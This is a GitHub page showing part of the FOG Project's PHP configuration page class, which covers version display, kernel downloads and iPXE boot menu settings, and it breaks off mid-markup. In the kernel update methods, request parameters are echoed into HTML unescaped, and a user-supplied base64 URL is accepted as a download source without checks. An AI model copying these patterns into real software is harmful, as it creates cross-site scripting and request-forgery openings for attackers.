=== Content from github.com_765f31cc_20250111_012138.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fblob%2Fa4bb1bf39ac53c3cbe623576915fbc3b5c80a00f%2Fpackages%2Fweb%2Flib%2Fpages%2Ffogconfigurationpage.class.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fblob%2Fa4bb1bf39ac53c3cbe623576915fbc3b5c80a00f%2Fpackages%2Fweb%2Flib%2Fpages%2Ffogconfigurationpage.class.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=FOGProject%2Ffogproject)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FOGProject](/FOGProject)
/
**[fogproject](/FOGProject/fogproject)**
Public

* [Notifications](/login?return_to=%2FFOGProject%2Ffogproject) You must be signed in to change notification settings
* [Fork
  227](/login?return_to=%2FFOGProject%2Ffogproject)
* [Star
   1.2k](/login?return_to=%2FFOGProject%2Ffogproject)

* [Code](/FOGProject/fogproject)
* [Issues
  45](/FOGProject/fogproject/issues)
* [Pull requests
  3](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects
  0](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

Additional navigation options

* [Code](/FOGProject/fogproject)
* [Issues](/FOGProject/fogproject/issues)
* [Pull requests](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

## Files

 a4bb1bf
## Breadcrumbs

1. [fogproject](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f)
2. /[packages](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages)
3. /[web](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web)
4. /[lib](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib)
5. /[pages](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages)
/
# fogconfigurationpage.class.php

Copy path Blame  Blame
## Latest commit

## History

[History](/FOGProject/fogproject/commits/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php)3527 lines (3527 loc) · 124 KB a4bb1bf
## Breadcrumbs

1. [fogproject](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f)
2. /[packages](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages)
3. /[web](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web)
4. /[lib](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib)
5. /[pages](/FOGProject/fogproject/tree/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages)
/
# fogconfigurationpage.class.php

Top
## File metadata and controls

* Code
* Blame

3527 lines (3527 loc) · 124 KB[Raw](https://github.com/FOGProject/fogproject/raw/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000<?php/\*\* \* The FOG Configuration Page display. \* \* PHP version 5 \* \* @category FOGConfigurationPage \* @package FOGProject \* @author Tom Elliott <tommygunsster@gmail.com> \* @license http://opensource.org/licenses/gpl-3.0 GPLv3 \* @link https://fogproject.org \*//\*\* \* The FOG Configuration Page display. \* \* @category FOGConfigurationPage \* @package FOGProject \* @author Tom Elliott <tommygunsster@gmail.com> \* @license http://opensource.org/licenses/gpl-3.0 GPLv3 \* @link https://fogproject.org \*/class FOGConfigurationPage extends FOGPage{ /\*\* \* The node this page enacts for. \* \* @var string \*/ public $node = 'about'; /\*\* \* Initializes the about page. \* \* @param string $name the name to add. \* \* @return void \*/ public function \_\_construct($name = '') { $this->name = \_('FOG Configuration'); parent::\_\_construct($this->name); $this->menu = array( 'home' => self::$foglang['Home'], 'license' => self::$foglang['License'], 'kernelUpdate' => self::$foglang['KernelUpdate'], 'pxemenu' => self::$foglang['PXEBootMenu'], 'customizepxe' => self::$foglang['PXEConfiguration'], 'newMenu' => self::$foglang['NewMenu'], 'clientupdater' => self::$foglang['ClientUpdater'], 'maclist' => self::$foglang['MACAddrList'], 'settings' => self::$foglang['FOGSettings'], 'logviewer' => self::$foglang['LogViewer'], 'config' => self::$foglang['ConfigSave'], 'http://www.sf.net/projects/freeghost' => self::$foglang['FOGSFPage'], 'https://fogproject.org' => self::$foglang['FOGWebPage'], 'https://github.com/fogproject/fogproject.git' => \_( 'FOG Project on Github' ), 'https://github.com/fogproject/fog-client.git' => \_( 'FOG Client on Github' ), 'https://wiki.fogproject.org/wiki/index.php' => \_('FOG Wiki'), 'https://forums.fogproject.org' => \_('FOG Forums'), 'https://www.paypal.com/cgi-bin/webscr?i' . 'item\_name=Donation+to+FOG+-+A+Free+Cloning+' . 'Solution&cmd=\_donations&business=fogproject' . '.org%40gmail.com' => \_('Donate to FOG'), ); self::$HookManager ->processEvent( 'SUB\_MENULINK\_DATA', array( 'menu' => &$this->menu, 'submenu' => &$this->subMenu, 'id' => &$this->id, 'notes'=>&$this->notes ) ); } /\*\* \* Redirects to the version when initially entering \* this page. \* \* @return void \*/ public function index() { $this->version(); } /\*\* \* Prints the version information for the page. \* \* @return void \*/ public function version() { $this->title = \_('FOG Version Information'); echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo $this->title; echo '</h4>'; echo '</div>'; echo '<div class="panel-body placehere" vers="' . FOG\_VERSION . '">'; echo '</div>'; echo '</div>'; echo '</div>'; echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('Kernel Versions'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body">'; Route::listem('storagenode'); $StorageNodes = json\_decode( Route::getData() ); $StorageNodes = $StorageNodes->storagenodes; $urls = array(); foreach ((array)$StorageNodes as &$StorageNode) { $url = $urls[] = filter\_var( sprintf( '%s://%s/fog/status/kernelvers.php', self::$httpproto, $StorageNode->ip ), FILTER\_SANITIZE\_URL ); if (!self::getClass('StorageNode', $StorageNode->id)->get('online')) { continue; } echo '<a id="' . $StorageNode->name . '" class="expand\_trigger btn btn-info btn-block"' . 'href="#' . $StorageNode->name . '">'; echo '<h4 class="title kernversionupdate">'; echo $StorageNode->name; echo ' '; echo \_('FOG Version'); echo ': ()'; echo '</h4>'; echo '</a>'; echo '<div id="' . $StorageNode->name . '" class="hidefirst">'; echo '<pre class="kernvers" urlcall="'; echo $url; echo '">'; echo '</pre>'; echo '</div>'; unset($StorageNode); } echo '</div>'; echo '</div>'; echo '</div>'; } /\*\* \* Display the fog license information \* \* @return void \*/ public function license() { $validLangs = [ 'de' => 'DE', 'en' => 'US', 'es' => 'ES', 'eu' => 'ES', 'fr' => 'FR', 'it' => 'IT', 'pt' => 'BR', 'zh' => 'CN' ]; $lang = isset($\_SESSION['FOG\_LANG']) ? $\_SESSION['FOG\_LANG'] : self::getSetting('FOG\_DEFAULT\_LOCALE'); if (!in\_array($lang, array\_keys($validLangs))) { $lang = 'en'; } $lang = "{$lang}\_{$validLangs[$lang]}.UTF-8"; $this->title = \_('FOG License Information'); $file = './languages/' . $lang . '/gpl-3.0.txt'; $contents = file\_get\_contents($file); $contents = preg\_replace('!\r?\n!', '<br/>', $contents); echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('GNU Gneral Public License'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body text-justify">'; echo $contents; echo '</div>'; echo '</div>'; echo '</div>'; } /\*\* \* Post our kernel download. \* \* @return void \*/ public function kernel() { $this->kernelUpdatePost(); } /\*\* \* Returns HTML formated output from kernel list array. \* \* @param array $jsonData kernel list array \* \* @return string \*/ public function generateHtmlKernelList($kernelData) { $html = '<div class="col-xs-12"><a href="#" class="btn btn-info btn-block trigger\_expand"><h4 class="title">Expand All</h4></a></div>'; foreach ($kernelData as $release) { if ($release->prerelease) { continue; } $kab\_version = array(); $found\_kab = preg\_match('/(.\*)([4-9]\.[0-9][0-9]\*\.[0-9][0-9]\*)([^0-9]\*)(20[0-9][0-9]\.[0-9][0-9]\.[0-9][0-9]\*)(.\*)/', $release->body, $kernel\_version, PREG\_OFFSET\_CAPTURE); foreach ($release->assets as $asset) { $arch\_short = ""; $arch = ""; switch ($asset->name) { case "arm\_Image": $arch\_short = "arm64"; $arch = "ARM 64 Bit"; break; case "bzImage": $arch\_short = "64"; $arch = "AMD/Intel 64 Bit"; break; case "bzImage32": $arch\_short = "32"; $arch = "AMD/Intel 32 Bit"; break; } if (isset($found\_kab) && $found\_kab && $arch\_short) { $k\_ver = $kernel\_version[2][0]; $k\_url = base64\_encode($asset->browser\_download\_url); switch (substr($release->name, 0, 3)) { case "FOG": $k\_hint = ' (FOG '.explode(' ', $release->name)[1].')'; break; case "Lat": $k\_hint = ' (devel)'; break; default: $k\_hint = ''; break; } $id = 'Kernel\_'.str\_replace(".", "\_", $k\_ver).'\_'.$arch\_short; $label = 'Kernel '.$k\_ver.' '.$arch.$k\_hint; $k\_date = date('F j, Y', strtotime($asset->created\_at)); $html .= '<div class="col-xs-12"><a class="expand\_trigger btn btn-info btn-block" id="'.$id.'" href="#'.$id.'"><h4 class="title">'.$label.'</h4></a></div><div class="hidefirst" id="'.$id.'">'; $html .= '<div class="col-xs-4">Date:<br/>Version:<br/>Architecture:<br/>Download:</div>'; $html .= '<div class="col-xs-8 text-right">'.$k\_date.'<br/>'.$k\_ver.'<br/>'.$arch.'<br/><a href="?node=about&sub=kernel&file='.$k\_url.'=&arch='.$arch\_short.'">Download <i class="fa fa-download fa-2x fa-fw"></i></a></div></div>'; } } } return $html; } /\*\* \* Show the kernel update page. \* \* @return void \*/ public function kernelUpdate() { $url = 'https://api.github.com/repos/FOGProject/fos/releases'; $jsonData = json\_decode(self::$FOGURLRequests->process($url)[0]); echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('Kernel Update'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body">'; printf( '%s %s %s. %s, %s, %s %s. %s, %s %s, %s.', \_('This section allows you to update'), \_('the Linux kernel which is used to'), \_('boot the client computers'), \_('In FOG'), \_('this kernel holds all the drivers for the client computer'), \_('so if you are unable to boot a client you may wish to'), \_('update to a newer kernel which may have more drivers built in'), \_('This installation process may take a few minutes'), \_('as FOG will attempt to go out to the internet'), \_('to get the requested Kernel'), \_('so if it seems like the process is hanging please be patient') ); echo '</div>'; echo '<div class="panel-body">'; echo $this->generateHtmlKernelList($jsonData); echo '</div>'; echo '</div>'; echo '</div>'; } /\*\* \* Download the form. \* \* @return void \*/ public function kernelUpdatePost() { global $node; global $sub; if (!isset($\_POST['install']) && $sub == 'kernelUpdate') { $url = 'https://api.github.com/repos/FOGProject/fos/releases'; $jsonData = json\_decode(self::$FOGURLRequests->process($url)[0]); echo $this->generateHtmlKernelList($jsonData); } elseif (isset($\_POST['install'])) { $\_SESSION['allow\_ajax\_kdl'] = true; $dstName = filter\_input(INPUT\_POST, 'dstName'); $\_SESSION['dest-kernel-file'] = trim( basename( $dstName ) ); $\_SESSION['tmp-kernel-file'] = sprintf( '%s%s%s%s', DS, trim( sys\_get\_temp\_dir(), DS ), DS, basename($\_SESSION['dest-kernel-file']) ); $file = filter\_input(INPUT\_GET, 'file'); $\_SESSION['dl-kernel-file'] = base64\_decode( $file ); if (file\_exists($\_SESSION['tmp-kernel-file'])) { unlink($\_SESSION['tmp-kernel-file']); } echo '<div class="col-xs-9">'; echo '<div class="kerninfo">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('Downloading Kernel'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body">'; echo '<i class="fa fa-cog fa-2x fa-spin"></i>'; echo ' '; echo \_('Starting process'); echo '</div>'; echo '</div>'; echo '</div>'; echo '</div>'; echo '</div>'; } else { $file = filter\_input(INPUT\_GET, 'file'); $arch = filter\_input(INPUT\_GET, 'arch'); $tmpFile = basename( $file ); $tmpArch = basename(base64\_decode($file)); $formstr = "?node={$node}&sub=kernelUpdate"; echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('Save Kernel'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body">'; echo '<form class="form-horizontal" method="post" action="'; $formstr; echo '">'; echo '<input type="hidden" name="file" value="'; echo $tmpFile; echo '"/>'; echo '<div class="col-xs-4">'; echo '<label class="control-label" for="dstName">'; echo \_('Kernel Name'); echo '</label>'; echo '</div>'; echo '<div class="col-xs-8">'; echo '<div class="input-group">'; echo '<input class="form-control" type="text" name="dstName" id=' . '"dstName" value="' . $tmpArch . '"/>'; echo '</div>'; echo '</div>'; echo '<div class="col-xs-4">'; echo '<label class="control-label" for="install">'; echo \_('Install Kernel'); echo '</label>'; echo '</div>'; echo '<div class="col-xs-8">'; echo '<button type="submit" class="btn btn-info btn-block" id=' . '"install" name="install">'; echo \_('Install'); echo '</button>'; echo '</div>'; echo '</form>'; echo '</div>'; echo '</div>'; echo '</div>'; } } /\*\* \* Display the ipxe menu configurations. \* \* @return void \*/ public function pxemenu() { $this->title = \_('FOG PXE Boot Menu Configuration'); unset($this->headerData); $this->attributes = array( array('class' => 'col-xs-4'), array('class' => 'col-xs-6 form-group'), array('class' => 'col-xs-2') ); $this->templates = array( '${field}', '${input}', '${span}', ); $ServicesToSee = array( 'FOG\_ADVANCED\_MENU\_LOGIN', 'FOG\_BOOT\_EXIT\_TYPE', 'FOG\_EFI\_BOOT\_EXIT\_TYPE', 'FOG\_IPXE\_BG\_FILE', 'FOG\_IPXE\_HOST\_CPAIRS', 'FOG\_IPXE\_INVALID\_HOST\_COLOURS', 'FOG\_IPXE\_MAIN\_COLOURS', 'FOG\_IPXE\_MAIN\_CPAIRS', 'FOG\_IPXE\_MAIN\_FALLBACK\_CPAIRS', 'FOG\_IPXE\_VALID\_HOST\_COLOURS', 'FOG\_KEY\_SEQUENCE', 'FOG\_NO\_MENU', 'FOG\_PXE\_ADVANCED', 'FOG\_PXE\_HIDDENMENU\_TIMEOUT', 'FOG\_PXE\_MENU\_HIDDEN', 'FOG\_PXE\_MENU\_TIMEOUT', ); list( $advLogin, $exitNorm, $exitEfi, $bgfile, $hostCpairs, $hostInvalid, $mainColors, $mainCpairs, $mainFallback, $hostValid, $bootKeys, $noMenu, $advanced, $hideTimeout, $hidChecked, $timeout ) = self::getSubObjectIDs( 'Service', array( 'name' => $ServicesToSee ), 'value', false, 'AND', 'name', false, '' ); $advLogin = $advLogin ? ' checked' : ''; $exitNorm = Service::buildExitSelector( 'bootTypeExit', $exitNorm, false, 'bootTypeExit' ); $exitEfi = Service::buildExitSelector( 'efiBootTypeExit', $exitEfi, false, 'efiBootTypeExit' ); $bootKeys = self::getClass('KeySequenceManager') ->buildSelectBox($bootKeys); $noMenu = ( $noMenu ? ' checked' : '' ); $hidChecked = ( $hidChecked ? ' checked' : '' ); $fieldsToData = function (&$input, $field) { $this->data[] = array( 'field' => $field, 'input' => ( is\_array($input) ? $input[0] : $input ), 'span' => ( is\_array($input) ? $input[1] : '' ) ); unset($input, $field); }; // Menu based changes. $fields = array( '<label for="mainColors">' . \_('Main Colors') . '</label>' => array( '<div class="input-group">' . '<textarea id="mainColors" name="mainColors" class="form-control">' . $mainColors . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the color settings of the main menu items') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hostValid">' . \_('Valid Host Colors') . '<label>' => array( '<div class="input-group">' . '<textarea id="hostValid" class="form-control" name="hostValid">' . $hostValid . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the color text on the menu if the host') . ' ' . \_('is valid') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hostInvalid">' . \_('Invalid Host Colors') . '</label>' => array( '<div class="input-group">' . '<textarea name="hostInvalid" class="form-control" id=' . '"hostInvalid">' . $hostInvalid . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the color text on the menu if the host') . ' ' . \_('is invalid') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="mainCpairs">' . \_('Main pairings') . '</label>' => array( '<div class="input-group">' . '<textarea id="mainCpairs" name="mainCpairs" class=' . '"form-control">' . $mainCpairs . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the pairings of colors to') . ' ' . \_('present and where/how they need to display') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="mainFallback">' . \_('Main fallback pairings') . '</label>' => array( '<div class="input-group">' . '<textarea class="form-control" id="mainFallback" name=' . '"mainFallback">' . $mainFallback . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the pairings as a fallback') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hostCpairs">' . \_('Host pairings') . '</label>' => array( '<div class="input-group">' . '<textarea class="form-control" id="hostCPairs" name="hostCpairs">' . $hostCpairs . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the pairings after host checks') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="timeout">' . \_('Menu Timeout') . ' (' . \_('in seconds') . ')' . '</label>' => array( '<div class="input-group">' . '<input type="text" id="timeout" name="timeout" value="' . $timeout . '" class="form-control"/>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the menu timeout') . '. ' . \_('This is set in seconds and causes the default option') . ' ' . \_('to be booted if no keys are pressed when the menu is') . ' ' . \_('open') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="bgfile">' . \_('Menu Background File') . '</label>' => array( '<div class="input-group">' . '<input type="text" id="bgfile" name="bgfile" value="' . $bgfile . '" class="form-control"/>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the background file to use') . ' ' . \_('for the menu background') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="menuSet">' . \_('Make Changes?') . '</label>' => '<button type="submit" id="menuSet" class="' . 'btn btn-info btn-block" name="updatemenuset">' . \_('Update') . '</button>' ); self::$HookManager->processEvent( 'IPXE\_MENU\_SETTINGS\_FIELDS', array( 'fields' => &$fields ) ); array\_walk($fields, $fieldsToData); self::$HookManager->processEvent( 'IPXE\_MENU\_SETTINGS', array( 'data' => &$this->data, 'templates' => &$this->templates, 'attributes' => &$this->attributes ) ); echo '<div class="col-xs-9">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center">'; echo '<h4 class="title">'; echo \_('iPXE Menu Settings'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body">'; echo '<form class="form-horizontal" method="post" action="' . $this->formAction . '">'; echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center expand\_trigger hand" id=' . '"menusettings">'; echo '<h4 class="title">'; echo \_('Menu colors, pairings, settings'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body hidefirst" id="menusettings">'; $this->render(12); echo '</div>'; echo '</div>'; $this->data = array(); $fields = array( '<label for="nomenu">' . \_('No Menu') . '</label>' => array( '<input type="checkbox" id="nomenu" name="nomenu"' . $noMenu . '/>', '<i class="fa fa-question hand" title="' . \_('Option sets if there will even') . ' ' . \_('be the presence of a menu') . ' ' . \_('to the client systems') . '. ' . \_('If there is not a task set') . ', ' . \_('it boots to the first device') . ', ' . \_('if there is a task') . ', ' . \_('it performs that task') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hidemenu">' . \_('Hide Menu') . '</label>' => array( '<input type="checkbox" id="hidemenu" name="hidemenu"' . $hidChecked . '/>', '<i class="fa fa-question hand" title="' . \_('Option sets the key sequence') . '. ' . \_('If none is specified') . ', ' . \_('ESC is defaulted') . '. ' . \_('Login with the FOG credentials and you will see the menu') . '. ' . \_('Otherwise it will just boot like normal') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hidetimeout">' . \_('Hide Menu Timeout') . '</label>' => array( '<div class="input-group">' . '<input type="text" id="hidetimeout" name="hidetimeout" ' . 'value="' . $hideTimeout . '" class="form-control"/>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Option specifies the timeout value for the hidden menu system') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="keysequence">' . \_('Boot Key Sequence') . '</label>' => array( $bootKeys, '<i class="fa fa-question hand" title="' . \_('Option sets the ipxe keysequence to enter to gain menu') . ' ' . \_('access to the hidden menu system') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="hideSet">' . \_('Make Changes?') . '</label>' => '<button type="submit" id="hideSet" class="' . 'btn btn-info btn-block" name="updatehideset">' . \_('Update') . '</button>' ); self::$HookManager->processEvent( 'IPXE\_HIDENOMENU\_SETTINGS\_FIELDS', array( 'fields' => &$fields ) ); array\_walk($fields, $fieldsToData); self::$HookManager->processEvent( 'IPXE\_HIDENOMENU\_SETTINGS', array( 'data' => &$this->data, 'templates' => &$this->templates, 'attributes' => &$this->attributes ) ); echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center expand\_trigger hand" id="' . 'menuhidesettings">'; echo '<h4 class="title">'; echo \_('Menu Hide/No Menu settings'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body hidefirst" id="menuhidesettings">'; $this->render(12); echo '</div>'; echo '</div>'; $this->data = array(); $fields = array( '<label for="bootTypeExit">' . \_('Exit to Hard Drive Type') . '</label>' => array( $exitNorm, '<i class="fa fa-question hand" title="' . \_('Option specifies the legacy boot exit method ipxe will use') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="efiBootTypeExit">' . \_('Exit to Hard Drive Type(EFI)') . '</label>' => array( $exitEfi, '<i class="fa fa-question hand" title="' . \_('Option specifies the efi boot exit method ipxe will use') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="exitSet">' . \_('Make Changes?') . '</label>' => '<button type="submit" id="exitSet" class="' . 'btn btn-info btn-block" name="updatebootexit">' . \_('Update') . '</button>' ); self::$HookManager->processEvent( 'IPXE\_EXITTYPE\_SETTINGS\_FIELDS', array( 'fields' => &$fields ) ); array\_walk($fields, $fieldsToData); self::$HookManager->processEvent( 'IPXE\_EXITTYPE\_SETTINGS', array( 'data' => &$this->data, 'templates' => &$this->templates, 'attributes' => &$this->attributes ) ); echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center expand\_trigger hand" id="' . 'menuexitsettings">'; echo '<h4 class="title">'; echo \_('Boot Exit settings'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body hidefirst" id="menuexitsettings">'; $this->render(12); echo '</div>'; echo '</div>'; $this->data = array(); $fields = array( '<label for="advlog">' . \_('Advanced Menu Login') . '</label>' => array( '<input type="checkbox" id="advlog" name="advmenulogin"' . $advLogin . '/>', '<i class="fa fa-question hand" title="' . \_('Option below enforces a login system') . ' ' . \_('for the advanced menu parameters') . '. ' . \_('If off') . ', ' . \_('no login will appear') . '. ' . \_('If on') . ', ' . \_('it will enforce login to gain access to the advanced') . ' ' . \_('menu system') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="advtext">' . \_('Advanced menu command') . '</label>' => array( '<div class="input-group">' . '<textarea id="advtext" class="form-control" name="adv">' . $advanced . '</textarea>' . '</div>', '<i class="fa fa-question hand" title="' . \_('Add any custom text you would like') . ' ' . \_('the advanced menu to use') . '. ' . \_('This is ipxe script commands to operate with') . '." data-toggle="tooltip" data-placement="right"></i>' ), '<label for="advSet">' . \_('Make Changes?') . '</label>' => '<button type="submit" id="advSet" class="' . 'btn btn-info btn-block" name="updateadvset">' . \_('Update') . '</button>' ); self::$HookManager->processEvent( 'IPXE\_ADVANCED\_SETTINGS\_FIELDS', array( 'fields' => &$fields ) ); array\_walk($fields, $fieldsToData); self::$HookManager->processEvent( 'IPXE\_ADVANCED\_SETTINGS', array( 'data' => &$this->data, 'templates' => &$this->templates, 'attributes' => &$this->attributes ) ); echo '<div class="panel panel-info">'; echo '<div class="panel-heading text-center expand\_trigger hand" id="' . 'advancedmenusettings">'; echo '<h4 class="title">'; echo \_('Advanced Menu settings'); echo '</h4>'; echo '</div>'; echo '<div class="panel-body 